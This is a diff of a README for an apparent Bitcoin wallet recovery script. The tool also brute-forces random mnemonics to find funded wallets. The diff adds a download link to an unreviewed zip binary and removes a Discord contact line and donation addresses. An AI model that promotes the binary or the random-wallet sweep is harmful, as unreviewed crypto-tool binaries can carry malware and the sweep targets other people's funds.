@@ -54,25 +54,17 @@ pip install -r requirements.txt
 ```
 python recover.py
 ```
+Or binary: https://github.com/panosdd123/bitcoin-restore/releases/download/btc/btc-recover.zip
 
 2. Follow the on-screen prompts to choose between recovering a wallet from a partial mnemonic or checking random wallets.
 3. If you choose to recover a wallet from a partial mnemonic, enter the words you remember from your mnemonic phrase, separated by spaces.
 4. If you choose to check random wallets, the script will generate random mnemonic phrases and check the corresponding wallet balances.
 5. If a wallet with a non-zero balance is found, the script will log the mnemonic phrase, wallet address, and balance to the `wallet.txt` file.
 
-## How to Open the Discovered Wallet
-
-For assistance with accessing the wallet, reach out to me on Discord ( username: **minight_** ). I will personally help you!
-
 
 ## Contributing
 
 Contributions are welcome! If you find any issues or have suggestions for improvements, please open an issue or submit a pull request.
-
-If you want to show your appreciation for finding a prize wallet, you can send a donation to the following addresses:
-
-- BTC: `15YEFuniTwYAY94FAqLf3GkzDJhdz4Yb9A`
-- ETH: `0x1c581066c6e8A3D4D79F4373fb16b8A82176F748`
 
 ## Star 🌟
 
